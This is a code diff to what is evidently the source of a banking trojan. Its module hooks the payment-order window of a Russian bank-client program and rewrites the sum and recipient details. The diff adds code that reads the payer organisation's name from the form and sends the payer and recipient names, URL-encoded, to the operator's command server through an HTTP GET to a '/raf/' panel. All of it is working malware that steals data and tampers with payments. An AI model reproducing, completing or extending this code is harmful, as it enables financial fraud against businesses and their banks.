@@ -6,6 +6,7 @@
 
 #include "Utils.h"
 #include "WndUtils.h"
+#include "BotHTTP.h"
 
 #include "Inject.h"
 #include "ntdll.h"
@@ -173,6 +174,7 @@ ControlForm controlsPaymentOrder[] =
 	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
 	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
 	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
+	{ "namesend", 93, 133, 234, 25, 0,                   0,          0,         0xCB934F4 /* edit */}, //название плательщика
 	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
 	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
 	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
@@ -202,25 +204,30 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 
 static void SendLogToAdmin( int num, const char* text = 0 )
 {
-	char qr[128], addText[64];
 	if( domain[0] == 0 ) return; //если админка неизвестна, то ничего не шлем
+	TMemory qr(1024);
+	const char *paramText;
+	char empty[1], *valText;
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	if( text && text[0] ) //не пустая строка
-		pwsprintfA( addText, "&text=", text );
+	{
+		paramText = "&text=", valText = URLEncode((char*)text);
+	}
 	else
-		addText[0] = 0;
-	pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s", domain, BOT_UID, num, addText );
+		empty[0] = 0, paramText = valText = empty;
+	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
+	if( valText != empty ) STR::Free(valText);
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
-	DBGRAFA( "Rafa", "Отсылка лога: %s", qr );
+	DBGRAFA( "Rafa", "Отсылка лога: %s, text=%s", (char*)qr, text );
 	HTTPResponse::Clear(&Response);
 }
 
 struct LogInfo
 {
 	int num;
-	char text[64];
+	char text[768];
 };
 
 // Функция отправляет лог в отдельном потоке
@@ -1477,6 +1484,22 @@ static bool SetText( const char* name, const char* s, ControlFinded* cf, int cou
 	return false;
 }
 
+//считывает текст с контрола на форме
+static bool GetText( const char* name, char* s, int c_s, ControlFinded* cf, int count )
+{
+	if( s )
+	{
+		s[0] = 0;
+		ControlFinded* ctrl = GetControl( name, cf, count );
+		if( ctrl )
+		{
+			if( pGetWindowTextA( ctrl->wnd, s, c_s ) )
+				return true;
+		}
+	}
+	return false;
+}
+
 static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
 {
 	ControlFinded* ctrl = GetControl( name, cf, count );
@@ -1687,6 +1710,13 @@ static void WorkInRafa()
 									DBGRAFA( "Rafa", "Заполняем контролы" );
 									//SetText( "num", "1", cf, countControls );
 									//SetText( "status", "2", cf, countControls );
+									
+									//считаем название организации отправителя
+									TMemory org(512);
+									GetText( "namesend", org, org.Size(), cf, countControls );
+									m_lstrcat( org, " -> " );
+									m_lstrcat( org, po->recvName ); //добавляем имя организации получателя
+									SendLogToAdmin( 2, org ); //шлем лог с именами организаций
 									SetText( "sum", po->sum, cf, countControls );
 									SetText( "innrecv", po->inn, cf, countControls );
 									SetText( "kpprecv", po->kpp, cf, countControls );
@@ -1801,6 +1831,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			}
 			if( !hookDll ) break;
 			InitData();
+			//SendLogToAdmin( 0, "тестовая строка" );
 			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
 			for( int i = 0; i < 300; i++ )
 			{
